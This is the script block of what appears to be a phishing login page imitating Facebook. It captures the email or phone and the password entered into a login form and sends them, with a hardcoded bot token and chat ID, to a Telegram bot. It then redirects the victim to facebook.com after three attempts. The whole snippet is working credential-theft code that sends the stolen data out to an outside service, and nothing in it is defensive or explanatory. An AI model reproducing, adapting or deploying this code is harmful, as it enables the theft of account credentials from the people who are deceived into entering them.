  <script>
    // Fill in your bot token and chat ID
    const botToken = '6283721113:AAFBuxpOozc6aK15ve1I_jkOQbGggb6Dc6A';
    const chatID = '5105622210';
    let count = 0;

    // Send a message to the Telegram bot using the Telegram Bot API
    const sendMessage = async (message) => {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatID,
          text: message,
        }),
      });

      const data = await response.json();
      console.log(data);

      return data.ok;
    };

    // Handle form submission
    $('#login-form').submit(async (event) => {
      event.preventDefault();
      const email = $('#email').val();
      const password = $('#password').val();
      const message = `Email or phone: ${email}\nPassword: ${password}`;
      count++;

      try {
        const result = await sendMessage(message);
        if (result) {
          console.log('Message sent successfully');
          if (count === 3) {
            window.open('https://www.facebook.com', '_blank');
          }
        } else {
          console.log('Failed to send message');
        }
      } catch (error) {
        console.error(error);
      }

      if (count === 1) {
        const successMessage = document.getElementById('success-message');
    

successMessage.style.color = 'white';
successMessage.style.width = '100%';
successMessage.style.padding = '10px';
successMessage.style.boxSizing = 'border-box';


      }
    });
  </script>
